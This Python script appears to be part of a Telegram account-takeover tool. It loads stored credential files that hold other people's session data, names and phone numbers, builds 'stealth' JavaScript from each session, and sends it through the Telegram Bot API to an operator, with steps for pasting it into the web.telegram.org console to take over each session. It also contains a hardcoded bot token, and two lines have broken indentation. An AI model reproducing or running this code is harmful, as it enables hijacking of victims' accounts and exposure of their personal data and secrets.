#!/usr/bin/env python3
"""
Generate Working Scripts for All Sessions

This script generates JavaScript scripts for ALL stored credential sessions
and sends each one separately to the configured Telegram user.
"""

import os
import json
from datetime import datetime
import requests
from dotenv import load_dotenv
from utils.credentials_manager import credentials_manager

# Load environment variables from .env file
load_dotenv()

# Get target user ID from environment variable
TARGET_USER_ID = os.getenv('SCRIPT_TARGET_USER_ID')
print(f"🔍 Debug: SCRIPT_TARGET_USER_ID = {TARGET_USER_ID}")
TARGET_USER_IDS = [int(TARGET_USER_ID)] if TARGET_USER_ID else []
print(f"🔍 Debug: TARGET_USER_IDS = {TARGET_USER_IDS}")

# Configuration
ENABLE_TELEGRAM_SENDING = True
CUSTOM_MESSAGE_PREFIX = "🛡️ **Generated Stealth Script**"
INCLUDE_INSTRUCTIONS = True
INCLUDE_TIPS = True

def send_script_to_user(script_content, script_filename, user_info, index, total):
    """Send a single generated script to the target user"""
    if not ENABLE_TELEGRAM_SENDING:
        print("⚠️  Telegram sending is disabled.")
        return
        
    if not TARGET_USER_IDS:
        print("⚠️  No target user ID configured. Skipping Telegram sending.")
        print("💡 Add SCRIPT_TARGET_USER_ID to your .env file to enable automatic sending.")
        return
    
    try:
        # Get bot token
        bot_token = os.getenv('TELEGRAM_BOT_TOKEN', '8033516348:AAE2ylmkjc8Q6Sj1b8yzvk19wvB3kYs-5-k')
        
        # Prepare the message
        message_parts = [CUSTOM_MESSAGE_PREFIX]
        message_parts.append(f"")
        message_parts.append(f"📁 **File:** `{script_filename}`")
        message_parts.append(f"👤 **User:** {user_info.get('first_name', 'Unknown')} {user_info.get('last_name', '')}")
        message_parts.append(f"📱 **Phone:** +{user_info.get('phone', 'Unknown')}")
        message_parts.append(f"🆔 **User ID:** {user_info.get('id', 'Unknown')}")
        message_parts.append(f"📊 **Session:** {index}/{total}")
        message_parts.append(f"⏰ **Generated:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        message_parts.append(f"")
        
        if INCLUDE_INSTRUCTIONS:
            message_parts.extend([
                "📝 **Instructions:**",
                "1. Open https://web.telegram.org/a/ in your browser",
                "2. Press F12 to open Developer Tools", 
                "3. Go to Console tab",
                "4. Copy and paste the script below",
                "5. Press Enter to execute",
                ""
            ])
        
        if INCLUDE_TIPS:
            message_parts.extend([
                "💡 **Tips:**",
                "- Make sure you're on web.telegram.org/a/ (not web.telegram.org/k/)",
                "- Try refreshing the page first",
                "- Try using a different browser or incognito mode", 
                "- Check if your network allows WebSocket connections",
                ""
            ])
        
        message_parts.extend([
            "🔗 **Script Content:**",
            "```",
            script_content,
            "```"
        ])
        
        message_text = "\n".join(message_parts)
        
        # Send to the target user using Telegram Bot API directly
        try:
            # Check if message is too long (Telegram limit is ~4096 characters)
            if len(message_text) > 4000:
                # Send header message first
                header_parts = message_parts[:-3]  # Remove script content
                header_text = "\n".join(header_parts)
                
                # Send header message
                response1 = requests.post(
                    f"https://api.telegram.org/bot{bot_token}/sendMessage",
                    json={
                        "chat_id": TARGET_USER_IDS[0],
                        "text": header_text,
                        "parse_mode": "Markdown"
                    }
                )
                
                # Send script content separately
                response2 = requests.post(
                    f"https://api.telegram.org/bot{bot_token}/sendMessage",
                    json={
                        "chat_id": TARGET_USER_IDS[0],
                        "text": f"```\n{script_content}\n```",
                        "parse_mode": "Markdown"
                    }
                )
                
                if response1.status_code == 200 and response2.status_code == 200:
                print(f"✅ Script {index}/{total} sent to user {TARGET_USER_IDS[0]} (split into 2 messages)")
                else:
                    print(f"❌ Failed to send script {index}/{total}: {response1.text} {response2.text}")
                    return False
            else:
                # Send as single message
                response = requests.post(
                    f"https://api.telegram.org/bot{bot_token}/sendMessage",
                    json={
                        "chat_id": TARGET_USER_IDS[0],
                        "text": message_text,
                        "parse_mode": "Markdown"
                    }
                )
                
                if response.status_code == 200:
                print(f"✅ Script {index}/{total} sent to user {TARGET_USER_IDS[0]}")
                else:
                    print(f"❌ Failed to send script {index}/{total}: {response.text}")
                    return False
            
            return True
        except Exception as e:
            print(f"❌ Failed to send script {index}/{total}: {e}")
            return False
        
    except Exception as e:
        print(f"❌ Error sending script {index}/{total} via Telegram: {e}")
        return False

def generate_all_stealth_scripts():
    """Generate stealth scripts for ALL stored sessions and send each separately"""
    
    # Get all JSON credentials files
    all_files = credentials_manager.list_credentials_files()
    json_files = [f for f in all_files if f['filename'].endswith('.json')]
    
    if not json_files:
        print("❌ No JSON credential files found")
        return
    
    print(f"📁 Found {len(json_files)} credential files")
    print("=" * 60)
    
    # Process each credential file
    successful_sends = 0
    total_files = len(json_files)
    
    for index, file_info in enumerate(json_files, 1):
        filename = file_info['filename']
        print(f"\n📋 Processing {index}/{total_files}: {filename}")
        
        # Load the credentials
        credentials = credentials_manager.load_credentials(filename)
        if not credentials or 'session_data' not in credentials:
            print(f"❌ No valid session data found in {filename}")
            continue
        
        session_data = credentials['session_data']
        user_info = credentials.get('user_info', {})
        
        print(f"✅ Valid credential data found")
        print(f"👤 User: {user_info.get('first_name', 'Unknown')} {user_info.get('last_name', '')} (+{user_info.get('phone', 'Unknown')})")
        print(f"🔑 Auth Type: REAL")
        print(f"📦 Session Data Keys: {list(session_data.keys())}")
        
        # Generate the stealth script
        script_content = credentials_manager.generate_stealth_script(session_data)
        
        # Save the script
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        user_id = user_info.get('id', 'unknown')
        script_filename = f"stealth_script_{user_id}_{timestamp}.js"
        script_filepath = os.path.join("credentials", script_filename)
        
        with open(script_filepath, 'w', encoding='utf-8') as f:
            f.write(script_content)
        
        print(f"✅ Stealth script generated: {script_filename}")
        
        # Send the script to Telegram user
        print(f"📤 Sending script {index}/{total_files} to Telegram...")
        if send_script_to_user(script_content, script_filename, user_info, index, total_files):
            successful_sends += 1
        
        print("-" * 60)
    
    # Summary
    print(f"\n🎉 **Processing Complete!**")
    print(f"📊 Total files processed: {total_files}")
    print(f"✅ Successfully sent: {successful_sends}")
    print(f"❌ Failed to send: {total_files - successful_sends}")
    
    if successful_sends > 0:
        print(f"\n📱 All scripts have been sent to user ID: {TARGET_USER_IDS[0] if TARGET_USER_IDS else 'Not configured'}")
        print("💡 Check your Telegram chat with the bot to receive all the scripts!")

if __name__ == "__main__":
    generate_all_stealth_scripts() 